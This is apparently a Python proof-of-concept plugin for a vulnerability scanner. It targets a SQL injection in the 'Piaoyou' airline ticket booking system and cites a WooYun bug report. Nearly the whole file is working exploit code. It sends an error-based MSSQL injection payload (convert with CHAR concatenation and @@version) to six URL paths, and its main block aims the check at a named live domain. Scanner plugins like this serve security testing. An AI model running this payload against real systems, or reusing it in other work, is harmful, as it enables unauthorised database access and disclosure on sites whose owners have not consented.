#!/usr/bin/env python
# -*- coding: utf-8 -*-
#票友机票预订系统通用SQL注入#6处打包
#refer:http://www.wooyun.org/bugs/wooyun-2010-0118867
#__author__ = 'xq17'

def assign(service, arg):
    if service == "piaoyou":
        return True, arg

def audit(arg):
    urls = [
    "ser_Hotel/SearchList.aspx?CityCode=1%27",
    "visa/visa_view.aspx?a=11",
    "travel/Default.aspx?leixing=11",
    "hotel/Default.aspx?s=11",
    "travel/Default.aspx?ecity=%E4%B8%8A%E6%B5%B7&leixing=11",
    "hotel/Default.aspx?s=11",
    ]
    for url in urls:
        vul = arg + url + "%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)--"
        code, head, res, errcode, _ = curl.curl2(vul)
        if code!=0 and 'WtFaBcMic' in res:
            security_hole(arg + url)


if __name__ == '__main__':
    from dummy import *
    audit(assign('piaoyou','http://www.iyoungsh.com/')[1])